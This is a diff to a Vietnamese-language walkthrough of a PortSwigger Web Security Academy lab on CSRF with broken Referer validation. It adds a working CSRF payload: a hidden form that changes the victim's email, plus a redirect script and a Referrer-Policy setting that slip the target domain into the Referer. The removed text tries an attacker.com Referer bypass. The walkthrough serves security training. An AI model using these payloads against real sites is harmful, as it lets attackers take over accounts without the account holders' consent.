@@ -121,6 +121,18 @@ Như vậy, ta vào exploit server và cấu hình đoạn HTML sau:
 Thẻ `<meta name="referrer" content="never">` sẽ ngăn không đưa dữ liệu vào header Referer của request tiếp theo. Sau khi click "Deliver to victim", kết quả thành công. 
 
 # 8. CSRF with broken Referer validation
-Ta thấy chỉ khi Referer header có domain là `https://0af000b004b75bb2c19df8f1007a00bf.web-security-academy.net` thì request đổi email mới được thực hiện thành công. Thử với payload là `https://attacker.com#https://0af000b004b75bb2c19df8f1007a00bf.web-security-academy.net`, kết quả email vẫn bị đổi. Như vậy server chỉ kiểm tra trong Referer header có chứa chuỗi `https://0af000b004b75bb2c19df8f1007a00bf.web-security-academy.net` hay không.
+Trong chức năng thay đổi email, sau một vài lần check thì ta nhận thấy chỉ khi trong header `Referrer` có chuỗi `0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net` thì mới có thể submit thành công.
 
-Vào exploit server
+Như vậy, ta vào exploit server và cấu hình đoạn code sau:
+```
+<form id="form" method="POST" action="https://0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net/my-account/change-email">
+<input type="hidden" name="email" value="hello@gmail.com">
+</form>
+<script>
+if(document.location.search==''){document.location="https://exploit-0ac8005903fbd08ac2770c95014d0097.exploit-server.net/exploit?query=0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net"}else{form.submit();}
+</script>
+```
+
+Đoạn code trên đầu tiên sẽ đưa người dùng đến `<exploit-server>/exploit`, sau đó tự động chuyển hướng đến `<exploit-server>/exploit?query=0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net`, cuối cùng mới submit form để tấn công CSRF. Ta cấu hình HTTP header `Referrer-Policy: unsafe-url` để Referrer header chứa cả query string.
+
+Sau khi submit, kết quả thành công.
